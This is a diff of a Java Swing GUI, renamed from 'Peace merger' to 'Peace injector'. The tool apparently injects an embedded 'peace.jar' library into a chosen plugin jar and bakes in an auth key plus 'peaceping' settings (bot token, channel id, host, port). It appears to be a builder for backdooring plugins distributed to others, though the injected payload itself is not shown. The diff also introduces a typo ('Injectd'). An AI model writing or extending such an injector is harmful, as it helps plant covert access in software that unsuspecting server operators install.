@@ -7,8 +7,8 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 
-/** GUI wrapper around {@link Merge} that writes a merged plugin jar with auth and peaceping settings baked in. */
-public final class MergerGui {
+/** GUI wrapper around {@link Inject} that writes a merged plugin jar with auth and peaceping settings baked in. */
+public final class InjectorGui {
     private final JTextField seed = new JTextField(34);
     private final JTextField out = new JTextField(34);
     private final JTextArea auth = new JTextArea(6, 34);
@@ -19,18 +19,18 @@ public final class MergerGui {
     private final JTextField host = new JTextField("localhost", 14);
     private final JTextField port = new JTextField("25566", 8);
     private final JLabel status = new JLabel(" ");
-    private final JButton mergeBtn = new JButton("Merge");
+    private final JButton mergeBtn = new JButton("Inject");
 
     public static void main(String[] args) {
         if (args.length == 1 && args[0].equals("--check")) { selfCheck(); return; }
         SwingUtilities.invokeLater(() -> {
             try { UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName()); } catch (Exception ignored) {}
-            new MergerGui().show();
+            new InjectorGui().show();
         });
     }
 
     private void show() {
-        JFrame f = new JFrame("Peace merger");
+        JFrame f = new JFrame("Peace injector");
         f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         JPanel root = new JPanel(new BorderLayout(0, 8));
         root.setBorder(new EmptyBorder(10, 10, 10, 10));
@@ -149,7 +149,7 @@ public final class MergerGui {
         if (announceOn && (tk.isEmpty() || ch.isEmpty())) { fail("peaceping needs bot token and channel id"); return; }
 
         StringBuilder cfg = new StringBuilder();
-        cfg.append("# added by Peace merger\n");
+        cfg.append("# added by Peace injector\n");
         cfg.append("psk: ").append(pskV).append('\n');
         if (announceOn) {
             String h = host.getText().trim();
@@ -175,7 +175,7 @@ public final class MergerGui {
         try {
             status.setForeground(Color.DARK_GRAY);
             status.setText("merging...");
-            byte[] merged = Merge.merge(
+            byte[] merged = Inject.merge(
                 Files.readAllBytes(Paths.get(seedPath)),
                 readEmbeddedOrFail("/lib/peace.jar", "peace library not embedded"),
                 new String(readEmbeddedOrFail("/lib/mapping.txt", "mapping not embedded"), StandardCharsets.UTF_8),
@@ -183,7 +183,7 @@ public final class MergerGui {
             Files.write(Paths.get(outPath), merged);
             status.setForeground(new Color(0, 128, 0));
             status.setText("OK - wrote " + outPath + " (" + merged.length + " bytes)");
-            JOptionPane.showMessageDialog(parent, "Merged plugin written to:\n" + outPath,
+            JOptionPane.showMessageDialog(parent, "Injectd plugin written to:\n" + outPath,
                 "Done", JOptionPane.INFORMATION_MESSAGE);
         } catch (IOException ex) {
             fail("merge failed: " + ex.getMessage());
@@ -198,7 +198,7 @@ public final class MergerGui {
     }
 
     private static byte[] readEmbeddedOrFail(String path, String what) throws IOException {
-        java.io.InputStream in = MergerGui.class.getResourceAsStream(path);
+        java.io.InputStream in = InjectorGui.class.getResourceAsStream(path);
         if (in == null) throw new IOException(what);
         try (in) { return in.readAllBytes(); }
     }
@@ -208,10 +208,10 @@ public final class MergerGui {
         try {
             SwingUtilities.invokeAndWait(() -> {
                 try { UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName()); } catch (Exception ignored) {}
-                new MergerGui().show();
+                new InjectorGui().show();
             });
             Thread.sleep(2000);
-            System.out.println("OK: merger gui built and shown");
+            System.out.println("OK: injector gui built and shown");
         } catch (Exception e) {
             System.out.println("FAIL: " + e);
             System.exit(1);
